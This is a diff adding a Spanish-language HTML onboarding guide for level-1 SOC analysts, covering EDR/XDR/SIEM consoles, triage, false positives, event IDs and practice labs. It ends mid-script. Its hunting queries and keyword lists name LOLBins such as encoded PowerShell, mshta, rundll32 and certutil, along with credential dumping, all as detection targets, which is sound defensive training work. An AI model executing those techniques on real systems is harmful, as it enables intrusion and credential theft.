+    <p class="lead">Las tres generan alertas. Cada una ve un pedazo distinto de la historia, y cuando sabes qué pedazo ve cada una, sabes dónde buscar el que falta.</p>
+  </div>
+  <div class="layers">
+    <article class="layer">
+      <span class="big">EDR</span>
+      <p class="q">¿Qué pasó dentro de esta máquina?</p>
+      <ul>
+        <li>Procesos, quién los abrió y con qué comando</li>
+        <li>Archivos creados, registro, servicios</li>
+        <li>Conexiones de red por proceso</li>
+        <li>Puede bloquear, aislar y darte una terminal remota</li>
+      </ul>
+      <p class="ex">Falcon Insight, Defender for Endpoint, agente de Cortex XDR</p>
+    </article>
+    <article class="layer">
+      <span class="big">XDR</span>
+      <p class="q">¿Esto es parte de algo más grande?</p>
+      <ul>
+        <li>Junta endpoint, correo, identidad y nube</li>
+        <li>Agrupa alertas sueltas en un solo incidente</li>
+        <li>Te muestra la historia del ataque de punta a punta</li>
+      </ul>
+      <p class="ex">Defender XDR (MDE + MDO + MDI + Defender for Cloud Apps), Cortex XDR, Falcon Insight XDR</p>
+    </article>
+    <article class="layer">
+      <span class="big">SIEM</span>
+      <p class="q">¿Qué dicen los demás sistemas?</p>
+      <ul>
+        <li>Logs de firewall, proxy, VPN, AD, Entra ID, nube, apps</li>
+        <li>Reglas de correlación propias del SOC o del cliente</li>
+        <li>Lo que el EDR no ve: equipos sin agente, red, SaaS</li>
+      </ul>
+      <p class="ex">Microsoft Sentinel, Splunk, Falcon Next-Gen SIEM, Cortex XSIAM</p>
+    </article>
+  </div>
+  <p class="analogy"><b>Piénsalo como un edificio.</b> El EDR es la cámara dentro de cada oficina. El XDR es el guardia que mira todas las cámaras y se da cuenta de que la misma persona pasó por tres pisos. El SIEM es la bitácora completa: quién entró por el estacionamiento, quién usó el elevador y a qué hora se abrió la puerta de emergencia.</p>
+</section>
+
+<!-- CONSOLAS -->
+<section id="consolas">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">02</span>
+    <p class="eyebrow">Dónde vas a vivir</p>
+    <h2>Las tres consolas</h2>
+    <p class="lead">Cambian los nombres de los botones, pero lo que buscas es lo mismo: quién, qué, desde dónde, qué hizo después y qué hizo la herramienta.</p>
+  </div>
+  <div class="tabs" role="tablist" id="ctabs"></div>
+  <div class="console" id="cpanel" role="tabpanel"></div>
+</section>
+
+<!-- ATAQUES -->
+<section id="ataques">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">03</span>
+    <p class="eyebrow">Qué detectan</p>
+    <h2>Familias de alertas</h2>
+    <p class="lead">Hay miles de nombres de alerta. Casi todas caen en una de estas once familias. Aprende la familia y el nombre exacto deja de asustarte. Toca cualquiera para ver qué revisar.</p>
+  </div>
+  <div class="toolbar">
+    <button class="filter" data-f="all" aria-pressed="true">Todas</button>
+    <button class="filter" data-f="EDR" aria-pressed="false">EDR</button>
+    <button class="filter" data-f="XDR" aria-pressed="false">XDR</button>
+    <button class="filter" data-f="SIEM" aria-pressed="false">SIEM</button>
+    <input class="search" id="asearch" type="search" placeholder="Buscar: lsass, psexec, mfa, rclone…" aria-label="Buscar familia de alerta">
+  </div>
+  <div class="attacks" id="attacks"></div>
+</section>
+
+<!-- TRIAGE -->
+<section id="triage">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">04</span>
+    <p class="eyebrow">El método</p>
+    <h2>Triage en seis pasos</h2>
+    <p class="lead">El mismo orden para cualquier alerta, en cualquier consola. Úsalo como checklist en tus primeras semanas; se guarda en tu navegador.</p>
+  </div>
+  <div class="steps" id="steps"></div>
+  <div class="clock">
+    <span class="big">20′</span>
+    <p><b>Regla práctica del equipo:</b> si es severidad alta o crítica y a los 20 minutos todavía no tienes claro qué es, escala con lo que tengas. Escribe qué revisaste y qué te falta. Nadie te va a regañar por pedir otra opinión; sí por quedarte callado.</p>
+  </div>
+  <div style="margin-top:12px"><button class="btn" id="resetSteps">Reiniciar checklist</button></div>
+</section>
+
+<!-- FP -->
+<section id="fp">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">05</span>
+    <p class="eyebrow">Cerrar bien</p>
+    <h2>Cómo descartar un falso positivo</h2>
+    <p class="lead">El error más común en nivel 1 es cerrar como falso positivo algo que no revisaste porque "se veía normal". El segundo es confundir un falso positivo con actividad autorizada. Son cosas distintas, y en tu nota se tienen que leer distintas.</p>
+  </div>
+  <div class="verdicts">
+    <div class="verdict tp"><p class="lbl">Verdadero positivo</p><p>La regla acertó y la actividad es maliciosa o no autorizada.</p><p class="ej">Ej. macro de Word que baja un ejecutable de una IP sin reputación.</p></div>
+    <div class="verdict tpb"><p class="lbl">TP benigno</p><p>La regla acertó, la actividad sí ocurrió, pero es legítima y autorizada.</p><p class="ej">Ej. el equipo de pentest corrió Mimikatz con ticket aprobado.</p></div>
+    <div class="verdict fp"><p class="lbl">Falso positivo</p><p>La regla se equivocó: lo que disparó no es lo que la regla buscaba.</p><p class="ej">Ej. regla de "comando codificado" que salta con un Base64 de una app de inventario.</p></div>
+  </div>
+  <h3 style="margin-bottom:16px">Seis preguntas antes de cerrar</h3>
+  <ol class="questions">
+    <li><b>¿Quién lo ejecutó y es normal para esa cuenta?</b>Una cuenta de servicio de parches corriendo PsExec es esperable. La cuenta de alguien de Recursos Humanos, no.</li>
+    <li><b>¿El binario es quien dice ser?</b>Revisa firma, ruta y hash. <span class="mono">svchost.exe</span> en <span class="mono">C:\Users\Public</span> no es svchost.</li>
+    <li><b>¿Se repite igual en otros equipos?</b>Mismo comando, misma hora, muchos equipos suele ser despliegue. Un solo equipo raro merece más atención.</li>
+    <li><b>¿Hay ticket, cambio o aviso que lo explique?</b>Pide el número. Si nadie lo puede confirmar, no lo inventes.</li>
+    <li><b>¿Qué pasó después?</b>Hijos, conexiones, archivos nuevos, persistencia. Algo legítimo rara vez termina hablando con una IP de un VPS a las 3 am.</li>
+    <li><b>¿Lo puedes defender con evidencia?</b>Si tu nota dice "parece normal" sin datos, todavía no terminaste.</li>
+  </ol>
+  <div class="callout"><b>Sobre exclusiones y tuning:</b> si una regla te molesta diario con lo mismo, documenta el patrón (cuenta, host, ruta, hash, comando) y pásalo a nivel 2. Nunca pidas excluir un binario completo como <span class="mono">powershell.exe</span> o <span class="mono">psexec.exe</span>: acota por cuenta, origen y ruta.</div>
+  <p class="eyebrow" style="margin-top:28px">De dónde salen la mayoría de falsos positivos</p>
+  <div class="fp-sources">
+    <div><b>Herramientas de despliegue</b>SCCM/MECM, Intune, PDQ, GPO, scripts de inventario. Ejecutan cosas en muchos equipos al mismo tiempo.</div>
+    <div><b>Software de administración remota</b>AnyDesk, TeamViewer, ScreenConnect. Ojo: los atacantes también los usan. Pregunta si es la herramienta oficial del cliente.</div>
+    <div><b>Escáneres y pentest</b>Nessus, Qualys, Rapid7, ejercicios de red team. Siempre debería existir un aviso o ventana.</div>
+    <div><b>Desarrolladores</b>Compilan, ofuscan, usan Python y PowerShell todo el día. Su "raro" es distinto al de Contabilidad.</div>
+    <div><b>Otras herramientas de seguridad</b>Un AV, DLP o backup que lee la memoria de LSASS o toca miles de archivos.</div>
+    <div><b>Usuarios que viajan</b>Viajes reales, VPN corporativa, datos móviles. Típico en alertas de viaje imposible.</div>
+  </div>
+</section>
+
+<!-- EVENTOS -->
+<section id="eventos">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">06</span>
+    <p class="eyebrow">Eventos de interés</p>
+    <h2>Los IDs que vas a ver una y otra vez</h2>
+    <p class="lead">No te los tienes que aprender de memoria el primer día. Ten esta tabla abierta y en un mes ya los vas a reconocer solos.</p>
+  </div>
+  <div class="toolbar"><input class="search" id="esearch" type="search" placeholder="Filtra por ID o tema: 4624, kerberos, servicio, dns…" aria-label="Filtrar eventos"></div>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>ID / evento</th><th>Fuente</th><th>Qué significa</th><th>Por qué te importa</th></tr></thead>
+      <tbody id="etable"></tbody>
+    </table>
+  </div>
+  <p style="margin-top:14px;font-size:.95rem" class="prose"><b>Tipos de logon (evento 4624):</b> <span class="mono">2</span> interactivo en teclado · <span class="mono">3</span> por red (carpetas compartidas, PsExec) · <span class="mono">4</span> tarea programada · <span class="mono">5</span> servicio · <span class="mono">7</span> desbloqueo · <span class="mono">9</span> NewCredentials (runas /netonly) · <span class="mono">10</span> RDP · <span class="mono">11</span> credenciales en caché.</p>
+</section>
+
+<!-- CASOS -->
+<section id="casos">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">07</span>
+    <p class="eyebrow">Práctica</p>
+    <h2>Tres casos, tú decides</h2>
+    <p class="lead">Patrones que sí vemos en turno, con los datos cambiados. Lee la evidencia y elige tu veredicto. Después compara tu razonamiento y llévate las consultas.</p>
+  </div>
+  <div id="cases"></div>
+</section>
+
+<!-- LABS -->
+<section id="labs">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">08</span>
+    <p class="eyebrow">Práctica guiada</p>
+    <h2>Laboratorios a tu medida</h2>
+    <p class="lead">Dime con qué consola trabajas y qué quieres reforzar. Te armo la lista en el orden en que conviene hacerla. Leer ayuda, pero lo que se queda es lo que practicas con las manos.</p>
+  </div>
+  <div class="lab-picker">
+    <div class="pick-row"><span class="pick-lbl">Trabajo con</span><div class="pick-opts" id="pickTool">
+      <button class="pick" data-v="all">Cualquier consola</button>
+      <button class="pick" data-v="kql">Defender / Sentinel · KQL</button>
+      <button class="pick" data-v="spl">Splunk · SPL</button>
+      <button class="pick" data-v="edr">Falcon / Cortex</button>
+    </div></div>
+    <div class="pick-row"><span class="pick-lbl">Quiero practicar</span><div class="pick-opts" id="pickTopic">
+      <button class="pick" data-v="all">Todo</button>
+      <button class="pick" data-v="endpoint">Endpoint</button>
+      <button class="pick" data-v="correo">Correo y phishing</button>
+      <button class="pick" data-v="identidad">Identidad</button>
+      <button class="pick" data-v="red">Red y movimiento lateral</button>
+      <button class="pick" data-v="eventos">Eventos de Windows</button>
+    </div></div>
+    <p class="pick-count" id="labCount" aria-live="polite"></p>
+  </div>
+  <div class="lab-grid" id="labgrid"></div>
+  <p class="lab-note"><b>¿Y Falcon?</b> CrowdStrike no tiene un laboratorio público gratuito. Si tu empresa es cliente, pide acceso a CrowdStrike University. Mientras tanto, Atomic Red Team en un laboratorio propio te deja ver cómo se ve cada técnica en cualquier EDR.</p>
+</section>
+
+<!-- HERRAMIENTAS -->
+<section id="herramientas">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">09</span>
+    <p class="eyebrow">Dónde investigar</p>
+    <h2>Herramientas y fuentes</h2>
+    <p class="lead">La consola te dice qué pasó. Estas páginas te ayudan a saber si una IP tiene historia, qué hace un comando raro y si alguien ya vio ese hash antes que tú.</p>
+  </div>
+  <div class="warn"><b>Antes de subir cualquier cosa:</b> busca por hash, nunca subas archivos del cliente a VirusTotal, ANY.RUN o Hybrid Analysis públicos. Lo que subes lo pueden descargar otros, incluidos documentos internos. Si hay que detonar un archivo, se hace en el sandbox privado autorizado y con aprobación de nivel 2.</div>
+  <div class="tool-groups" id="tools"></div>
+</section>
+
+<!-- GLOSARIO -->
+<section id="glosario">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">10</span>
+    <p class="eyebrow">Hablar el idioma</p>
+    <h2>Glosario</h2>
+    <p class="lead">Las palabras que vas a escuchar en tu primer turno. Muchas se dicen en inglés y así se quedan.</p>
+  </div>
+  <div class="toolbar"><input class="search" id="gsearch" type="search" placeholder="Buscar término…" aria-label="Buscar término"></div>
+  <dl class="gloss" id="gloss"></dl>
+</section>
+
+<!-- APRENDER -->
+<section id="aprender">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">11</span>
+    <p class="eyebrow">Seguir aprendiendo</p>
+    <h2>Dónde practicar</h2>
+    <p class="lead">Ordenado por cuándo te va a servir. Empieza por la primera columna; la tercera es para cuando ya cierres alertas sin ayuda.</p>
+  </div>
+  <div class="learn" id="learn"></div>
+</section>
+
+<!-- KIT -->
+<section id="kit">
+  <div class="sec-head">
+    <span class="sec-num" aria-hidden="true">12</span>
+    <p class="eyebrow">Para llevar</p>
+    <h2>Kit de turno</h2>
+  </div>
+  <div class="kit">
+    <div>
+      <div class="row"><h3>Plantilla de nota de cierre</h3><span><span class="toast" id="tplToast"></span> <button class="btn" id="copyTpl">Copiar</button></span></div>
+      <textarea id="tpl" aria-label="Plantilla de nota de cierre">Veredicto: [Verdadero positivo / TP benigno / Falso positivo]
+Alerta: [nombre exacto] | Consola: [Falcon / Defender / Cortex] | ID: [ ]
+Cliente: [ ] | Host: [ ] | Usuario: [ ]
+Fecha y hora (CDMX): [dd/mm/aaaa hh:mm]
+
+Qué pasó:
+[2 o 3 líneas. Proceso padre → hijo, comando, qué hizo después]
+
+Evidencia revisada:
+- Árbol de procesos y línea de comandos:
+- Reputación (hash / IP / dominio) y fuente:
+- Alcance (¿otros equipos o usuarios?):
+- Contexto (ticket, cambio, dueño del activo):
+
+Por qué este veredicto:
+[Una o dos frases con el dato que lo sostiene]
+
+Acciones tomadas:
+[Contención, bloqueo, escalamiento, ninguna]
+
+Escalado a / ticket: [ ]</textarea>
+    </div>
+    <div>
+      <h3 style="margin-bottom:12px">Escala sin pensarlo dos veces</h3>
+      <ul>
+        <li>Cualquier volcado o acceso sospechoso a la memoria de <span class="mono">lsass.exe</span>, aunque se haya bloqueado.</li>
+        <li>Borrado de shadow copies, cifrado masivo o nota de rescate.</li>
+        <li>Borrado de logs (1102) o apagado del antivirus/EDR.</li>
+        <li>Actividad rara en un controlador de dominio o con una cuenta de Domain Admin.</li>
+        <li>Inicio de sesión exitoso después de bombardeo de MFA o desde infraestructura anónima.</li>
+        <li>Reglas de bandeja que reenvían correo afuera o esconden mensajes.</li>
+        <li>El mismo indicador malicioso en más de un equipo.</li>
+        <li>Algo que no entiendes en un activo crítico del cliente.</li>
+      </ul>
+      <h3 style="margin:22px 0 12px">Errores de novato</h3>
+      <ul>
+        <li>Cerrar por el título sin abrir el árbol de procesos.</li>
+        <li>Decodificar el Base64 y no leer lo que dice.</li>
+        <li>Buscar el hash en un solo equipo y no en toda la flota.</li>
+        <li>Olvidar la zona horaria: la consola, el cliente y tú pueden tener tres horas distintas.</li>
+        <li>Tomar una acción de contención sin autorización del runbook o de nivel 2.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="autor">
+  <div class="author">
+    <aside class="author-id">
+      <span class="avatar big" aria-hidden="true">AM</span>
+      <p class="eyebrow">Quién hizo esta guía</p>
+      <h2 class="author-name">Alejandro Martínez</h2>
+      <p class="role">Threat Hunter · Equipo de Advanced Hunting</p>
+      <p class="role muted">Security Operations Center · T-Systems México</p>
+      <a class="btn-in" href="https://www.linkedin.com/in/alejandro-martinez-acu%C3%B1a-321b9b225" target="_blank" rel="noopener"><span aria-hidden="true">in</span> Conecta en LinkedIn</a>
+      <dl class="author-stats">
+        <div><dt>Versión</dt><dd>1.0</dd></div>
+        <div><dt>Familias</dt><dd>11</dd></div>
+        <div><dt>Casos</dt><dd>3</dd></div>
+        <div><dt>Labs</dt><dd>17</dd></div>
+      </dl>
+    </aside>
+    <div class="author-why">
+      <h3>Por qué existe</h3>
+      <p class="first">Al principio, entrar a un SOC se siente así: varias consolas abiertas, alertas en rojo y la impresión de que todos saben algo que tú no. Es normal. A todos nos pasó.</p>
+      <p>Cuando yo empecé no había una guía como esta. Aprendí preguntando, leyendo writeups a deshoras y cerrando alertas que hoy resuelvo en cinco minutos y en ese momento me tomaban una hora. Me equivoqué varias veces. Cerré cosas que no debí cerrar y escalé otras que no hacían falta. De cada error salió una de las reglas que vas a leer aquí.</p>
+      <p>Con el tiempo entendí que lo difícil no es la herramienta. Falcon, Defender y Cortex se aprenden en unas semanas. Lo difícil es saber qué preguntarle a una alerta, en qué orden revisar y cuándo ya tienes evidencia suficiente para decidir. Eso casi nadie lo escribe, porque se aprende en turno.</p>
+      <p>Por eso armé Primera Línea SOC. Junté lo que me hubiera gustado leer en mi primera semana: un método de triage, los eventos que más se repiten, las fuentes que uso todos los días, tres casos parecidos a los que vas a ver y laboratorios para que practiques sin miedo a romper nada.</p>
+      <p>No es para memorizar. Tenla abierta mientras trabajas, úsala como checklist y regresa cuando algo no te cuadre. Si algo no queda claro o crees que falta un tema, escríbeme. Esta guía crece con lo que tú veas en turno.</p>
+    </div>
+  </div>
+  <figure class="quote">
+    <span class="quote-mark" aria-hidden="true">“</span>
+    <blockquote><p>Nadie nace sabiendo leer un árbol de procesos. Se aprende alerta por alerta, y se aprende más rápido cuando alguien comparte lo que ya sabe.</p></blockquote>
+    <figcaption>Alejandro Martínez · Threat Hunting</figcaption>
+  </figure>
+</section>
+
+<footer>
+  <p><b>Primera Línea SOC v1.0</b> · Creada por Alejandro Martínez · <a href="https://www.linkedin.com/in/alejandro-martinez-acu%C3%B1a-321b9b225" target="_blank" rel="noopener">LinkedIn</a>. Material interno de inducción para analistas SOC nivel 1. Los casos usan datos ficticios; las IPs son de rangos de documentación (RFC 5737) y los dominios están desactivados con <span class="mono">[.]</span>.</p>
+</footer>
+</div>
+
+<script>
+const $=s=>document.querySelector(s);
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+function store(k,v){try{if(v===undefined)return JSON.parse(localStorage.getItem(k)||'null');localStorage.setItem(k,JSON.stringify(v))}catch(e){return null}}
+async function copyText(text,btn){
+  try{await navigator.clipboard.writeText(text);const o=btn.textContent;btn.textContent='Copiado';setTimeout(()=>btn.textContent=o,1400)}
+  catch(e){btn.textContent='Selecciona y copia';}
+}
+function codeBlock(lang,code){
+  return `<div class="code"><div class="lang"><span>${esc(lang)}</span><button class="btn cp">Copiar</button></div><pre>${esc(code)}</pre></div>`;
+}
+document.addEventListener('click',e=>{
+  const b=e.target.closest('.cp'); if(!b)return;
+  const pre=b.closest('.code').querySelector('pre');
+  navigator.clipboard?copyText(pre.textContent,b):null;
+  if(!navigator.clipboard){const r=document.createRange();r.selectNodeContents(pre);const s=getSelection();s.removeAllRanges();s.addRange(r)}
+});
+
+/* ---------- CONSOLAS ---------- */
+const consoles=[
+ {id:'falcon',name:'CrowdStrike Falcon',
+  where:['Endpoint security → Endpoint detections (en consolas nuevas también aparecen en la vista unificada de detecciones/incidentes de Next-Gen SIEM).','Cada detección abre el árbol de procesos con la acción que tomó Falcon en cada nodo.'],
+  fields:['Severity y Tactic/Technique (ya viene mapeado a MITRE)','Command line del proceso que disparó y de su padre','Acción tomada: Process killed, Blocked, Quarantined o solo Detected','SHA256 del archivo, usuario y host','Mira los íconos del árbol: el nodo naranja/rojo es el que disparó, no siempre el origen'],
+  buttons:['Process explorer / árbol de procesos','Real Time Response (RTR): terminal remota en el host','Network contain: aísla el equipo (solo con autorización)','Advanced event search (CQL) para buscar en toda la flota','Host management para ver al equipo, su política y sensor'],
+  events:['ProcessRollup2','DnsRequest','NetworkConnectIP4','NewExecutableWritten','UserLogon','UserLogonFailed2','AsepValueUpdate','ScheduledTaskRegistered'],
+  tip:'Revisa la política de prevención del host. Un equipo en modo "detect only" no bloqueó nada aunque la alerta se vea roja, y eso cambia la urgencia.',
+  lang:'CQL',q:`// ¿Qué abrió este usuario en este equipo en las últimas horas?
+#event_simpleName=ProcessRollup2 ComputerName="LAP-CONTAB-014"
+| table([@timestamp, UserName, ParentBaseFileName, FileName, CommandLine])
+| sort(@timestamp, order=asc)`},
+ {id:'defender',name:'Microsoft Defender XDR',
+  where:['security.microsoft.com → Incidents & alerts. Trabaja desde el incidente, no desde la alerta suelta: ahí Defender ya juntó lo relacionado.','Si el cliente tiene Sentinel, las mismas alertas llegan como incidentes al SIEM con reglas extra.'],
+  fields:['Detection source: EDR, Antivirus, Office 365, Identity, Cloud Apps o Custom detection','Attack story: la cronología y el gráfico del incidente','Categoría y técnicas MITRE','Assets: equipos, usuarios y buzones involucrados','Evidence and response: archivos, IPs, URLs y su estado (remediado o no)'],
+  buttons:['Device timeline: todo lo que pasó en el equipo minuto a minuto','Advanced hunting (KQL)','Live response: terminal remota','Isolate device y Restrict app execution','Action center para ver qué ya se remedió'],
+  events:['DeviceProcessEvents','DeviceNetworkEvents','DeviceFileEvents','DeviceRegistryEvents','DeviceLogonEvents','EmailEvents','UrlClickEvents','IdentityLogonEvents','AlertEvidence'],
+  tip:'Una alerta "Automatically resolved" por AIR no quiere decir que no pasó nada. Abre la investigación automática y confirma qué remedió y qué dejó pendiente.',
+  lang:'KQL',q:`// Todo lo que abrió Word, Excel u Outlook en las últimas 24 h
+DeviceProcessEvents
+| where Timestamp > ago(24h)
+| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
+| where FileName in~ ("powershell.exe","cmd.exe","mshta.exe","wscript.exe","rundll32.exe")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`},
+ {id:'cortex',name:'Palo Alto Cortex XDR',
+  where:['Incident Response → Incidents. Cada incidente agrupa alertas; desde ahí abres la tabla de alertas.','Para entender una alerta, abre la Causality View: es el árbol desde el proceso que originó la cadena.'],
+  fields:['Alert source: XDR Agent, BIOC, Analytics, Analytics BIOC, IOC, Correlation','Action: Detected o Prevented (Blocked)','CGO (Causality Group Owner): el proceso raíz de la cadena. Casi siempre es lo que más importa','Initiated by y command line','Veredicto de WildFire si hay archivo involucrado'],
+  buttons:['Causality view y Timeline view','XQL Search en el dataset xdr_data','Live Terminal: terminal remota','Isolate endpoint (con autorización)','Investigate in XQL desde la propia alerta'],
+  events:['ENUM.PROCESS','ENUM.NETWORK','ENUM.FILE','ENUM.REGISTRY','ENUM.EVENT_LOG','xdr_data'],
+  tip:'Empieza por el CGO. Si el CGO es un proceso legítimo de despliegue (por ejemplo el agente de SCCM) la historia cambia mucho frente a un CGO que es un .exe desconocido en Descargas.',
+  lang:'XQL',q:`// Procesos hijos de PowerShell en un equipo
+dataset = xdr_data
+| filter event_type = ENUM.PROCESS and agent_hostname = "LAP-CONTAB-014"
+| filter lowercase(actor_process_image_name) = "powershell.exe"
+| fields _time, actor_effective_username, action_process_image_name, action_process_image_command_line
+| sort asc _time`}
+];
+function renderConsole(id){
+  const c=consoles.find(x=>x.id===id);
+  document.querySelectorAll('#ctabs .tab').forEach(t=>t.setAttribute('aria-selected',t.dataset.id===id));
+  $('#cpanel').innerHTML=`
+   <div class="blk"><h4>Dónde vive la alerta</h4><ul>${c.where.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+   <div class="blk"><h4>Lo primero que lees</h4><ul>${c.fields.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+   <div class="blk"><h4>Botones que vas a usar</h4><ul>${c.buttons.map(x=>`<li>${esc(x)}</li>`).join('')}</ul></div>
+   <div class="blk"><h4>Eventos y tablas que más vas a usar</h4><div class="chips">${c.events.map(x=>`<span class="chip">${esc(x)}</span>`).join('')}</div>${codeBlock(c.lang,c.q)}</div>
+   <p class="tip"><b>Consejo de turno.</b> ${esc(c.tip)}</p>`;
+  store('tc_console',id);
+}
+$('#ctabs').innerHTML=consoles.map(c=>`<button class="tab" role="tab" data-id="${c.id}">${esc(c.name)}</button>`).join('');
+$('#ctabs').addEventListener('click',e=>{const t=e.target.closest('.tab');if(t)renderConsole(t.dataset.id)});
+renderConsole(store('tc_console')||'falcon');
+
+
+/* ---------- LABS ---------- */
+const labs=[
+ {p:'TryHackMe',t:'Windows Event Logs',u:'https://tryhackme.com/room/windowseventlogs',d:'Visor de eventos, filtros por ID y qué guarda cada log. La base de casi todo lo demás.',tools:['any'],topics:['eventos','endpoint'],lv:'Básico',h:'~2 h'},
+ {p:'LetsDefend',t:'Consola SOC simulada',u:'https://letsdefend.io',d:'Alertas que llegan a una cola y tienes que cerrar con veredicto. Lo más parecido a un turno real.',tools:['any'],topics:['endpoint','correo','identidad','red','eventos'],lv:'Básico',h:'Libre'},
+ {p:'TryHackMe',t:'CyberChef: The Basics',u:'https://tryhackme.com/room/cyberchefbasics',d:'Decodifica Base64, PowerShell codificado y URLs. La vas a usar desde tu primera alerta.',tools:['any'],topics:['endpoint','correo'],lv:'Básico',h:'~1 h'},
+ {p:'TryHackMe',t:'MITRE',u:'https://tryhackme.com/room/mitre',d:'Cómo leer una técnica de ATT&CK y conectar lo que ves en la alerta con lo que hace el atacante.',tools:['any'],topics:['endpoint','correo','identidad','red','eventos'],lv:'Básico',h:'~2 h'},
+ {p:'TryHackMe',t:'Phishing Analysis Fundamentals',u:'https://tryhackme.com/room/phishingemails1tryoe',d:'Encabezados, remitentes falsos y adjuntos. El tipo de caso que más vas a revisar.',tools:['any'],topics:['correo'],lv:'Básico',h:'~1 h'},
+ {p:'TryHackMe',t:'Sysmon',u:'https://tryhackme.com/room/sysmon',d:'Procesos, red y acceso a LSASS con Sysmon. Leerlo se parece mucho a leer la telemetría de un EDR.',tools:['any','edr'],topics:['endpoint','eventos','red'],lv:'Básico',h:'~2 h'},
+ {p:'TryHackMe',t:'Threat Intelligence Tools',u:'https://tryhackme.com/room/threatinteltools',d:'urlscan, Talos, AbuseIPDB y compañía aplicados a un caso, no solo de nombre.',tools:['any'],topics:['correo','red'],lv:'Básico',h:'~2 h'},
+ {p:'TryHackMe',t:'Alert Triage with Splunk',u:'https://tryhackme.com/room/alerttriagewithsplunk',d:'Triage de alertas dentro de Splunk, con búsquedas SPL de verdad.',tools:['spl'],topics:['endpoint','eventos'],lv:'Básico',h:'~2 h'},
+ {p:'Microsoft',t:'Kusto Detective Agency',u:'https://detective.kusto.io',d:'Retos de KQL contados como misterio. La forma más entretenida de aprender a consultar.',tools:['kql'],topics:['eventos','identidad','red'],lv:'Intermedio',h:'Por temporadas'},
+ {p:'Microsoft Learn',t:'Sentinel skill-up y Training Lab',u:'https://learn.microsoft.com/azure/sentinel/skill-up-resources',d:'Ruta oficial de Sentinel. Incluye el Training Lab con datos de ejemplo, reglas e incidentes para investigar.',tools:['kql'],topics:['identidad','correo','endpoint'],lv:'Intermedio',h:'Por módulos'},
+ {p:'Palo Alto Beacon',t:'Cortex XDR y XQL',u:'https://beacon.paloaltonetworks.com',d:'Cursos oficiales de Cortex: incidentes, Causality View y consultas XQL.',tools:['edr'],topics:['endpoint'],lv:'Básico',h:'Por curso'},
+ {p:'CyberDefenders',t:'PsExec Hunt',u:'https://cyberdefenders.org/blueteam-ctf-challenges/psexec-hunt/',d:'Rastrea PsExec en una captura de red y reconstruye por dónde se movió el atacante.',tools:['any'],topics:['red'],lv:'Intermedio',h:'~1 h'},
+ {p:'GitHub',t:'EVTX-ATTACK-SAMPLES',u:'https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES',d:'Logs .evtx de ataques ordenados por táctica. Ábrelos en el Visor de eventos y encuentra la técnica tú solo.',tools:['any'],topics:['eventos','endpoint','red'],lv:'Intermedio',h:'Libre'},
+ {p:'Splunk',t:'Boss of the SOC v3',u:'https://github.com/splunk/botsv3',d:'Dataset completo con preguntas: correo, endpoint, red y nube. Una investigación entera en Splunk.',tools:['spl'],topics:['endpoint','correo','red','identidad'],lv:'Intermedio',h:'Varios días'},
+ {p:'OTRF',t:'Security Datasets',u:'https://securitydatasets.com',d:'Datos de ataques simulados listos para cargar en tu SIEM y practicar consultas.',tools:['kql','spl'],topics:['eventos','endpoint'],lv:'Intermedio',h:'Libre'},
+ {p:'CyberDefenders',t:'Labs de ransomware',u:'https://cyberdefenders.org/search/labs/?q=ransomware',d:'Reconstruye intrusiones que terminaron en cifrado. Practica qué pasó antes del ransomware.',tools:['any'],topics:['endpoint'],lv:'Intermedio',h:'Por lab'},
+ {p:'Red Canary',t:'Atomic Red Team',u:'https://github.com/redcanaryco/atomic-red-team',d:'Ejecuta técnicas en tu propio laboratorio y mira cómo aparecen en Falcon, Defender o Cortex.',tools:['edr','kql'],topics:['endpoint','red'],lv:'Avanzado',h:'Libre'}
+];
+const topicName={endpoint:'Endpoint',correo:'Correo',identidad:'Identidad',red:'Red',eventos:'Eventos'};
+let pick=Object.assign({tool:'all',topic:'all'},store('tc_labs')||{});
+function renderLabs(){
+  document.querySelectorAll('#pickTool .pick').forEach(b=>b.setAttribute('aria-pressed',b.dataset.v===pick.tool));
+  document.querySelectorAll('#pickTopic .pick').forEach(b=>b.setAttribute('aria-pressed',b.dataset.v===pick.topic));
+  const l=labs.filter(x=>(pick.tool==='all'||x.tools.includes(pick.tool)||x.tools.includes('any'))&&(pick.topic==='all'||x.topics.includes(pick.topic)));
+  $('#labCount').textContent=l.length+(l.length===1?' laboratorio':' laboratorios')+' en tu ruta. Empieza por el 01.';
+  $('#labgrid').innerHTML=l.map((x,i)=>`<article class="lab">
+    <span class="step-n" aria-hidden="true">${String(i+1).padStart(2,'0')}</span>
+    <span class="plat">${esc(x.p)}</span>
+    <h3>${esc(x.t)}</h3>
+    <p>${esc(x.d)}</p>
+    <div class="lab-tags"><span class="lv">${esc(x.lv)}</span><span>${esc(x.h)}</span>${x.topics.length<5?x.topics.map(t=>`<span>${topicName[t]}</span>`).join(''):'<span>General</span>'}</div>
+    <a class="go" href="${x.u}" target="_blank" rel="noopener">Abrir laboratorio ↗</a>
+  </article>`).join('');
+}
+$('#pickTool').addEventListener('click',e=>{const b=e.target.closest('.pick');if(!b)return;pick.tool=b.dataset.v;store('tc_labs',pick);renderLabs()});
+$('#pickTopic').addEventListener('click',e=>{const b=e.target.closest('.pick');if(!b)return;pick.topic=b.dataset.v;store('tc_labs',pick);renderLabs()});
+renderLabs();
+const labBy=t=>labs.find(x=>x.t===t);
+
+/* ---------- FAMILIAS ---------- */
+const attacks=[
+ {t:'Ejecución sospechosa y LOLBins',l:['EDR'],m:'T1059 · T1218',s:'high',k:'powershell enc encoded mshta rundll32 regsvr32 certutil wscript lolbin',
